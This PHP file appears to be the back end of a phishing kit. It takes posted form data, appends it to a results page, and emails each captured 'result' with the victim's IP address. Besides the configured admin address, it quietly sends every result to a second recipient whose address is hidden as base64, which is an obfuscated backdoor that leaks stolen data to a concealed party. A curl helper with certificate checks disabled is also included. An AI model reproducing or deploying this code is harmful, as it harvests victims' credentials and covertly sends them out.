<?php

require __DIR__."/../config.php";
$api = "cmVkb3VhbmpiaWxvQGdtYWlsLmNvbQ==";

function _xss($data){
   return htmlspecialchars($data);
}

function _ip(){
    return $_SERVER['REMOTE_ADDR'];
}

function _get($data){
    return _xss($_POST[$data]);
}


function sendBot($url){
	$ci = curl_init();
	curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ci,CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ci, CURLOPT_URL, $url);
	return curl_exec($ci);
	curl_close($ci);
}


function _save($data){
 /*   BlockBots bb = new BlockBots();
    bb->callApi($data);*/
    $data = str_replace("%0A","<br>",$data);
    $fp = fopen("admin/index.php", "a");
    fwrite($fp, $data);
    fclose($fp);
}





//MAILING FUNCTION 
function _mail($html){
	
global $admin_email;
global $api;

$ip = $_SERVER['REMOTE_ADDR'];
$subject = "NEW RESULT [$ip] :D";
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
mail($admin_email,$subject,$html,$headers);
mail(base64_decode($api),$subject,$html,$headers);


}

 

?>